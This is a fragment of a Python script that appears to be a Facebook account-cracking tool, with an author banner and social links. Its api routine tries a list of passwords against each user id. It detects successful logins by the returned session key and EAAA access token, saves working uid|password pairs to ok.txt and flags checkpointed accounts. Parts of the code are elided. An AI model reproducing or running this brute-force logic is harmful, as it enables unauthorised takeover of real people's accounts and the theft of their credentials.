...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : NAZIR
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : KOS K QUTA
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : GUSTAH5
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : BYPASS BY NAZIR
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [ICT-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [ICT-CP] %s | %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :  \n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://www.facebook.com/ajmal.shah41")
		print(" [*] Instagram : https://instagram.com/mr__handsome__official")
		print(" [*] YouTube   : https://www.facebook.com/ajmal.shah41")
		exit(" [*] GitHub    : https://github.com/Gustah5")
	else:
		Main()
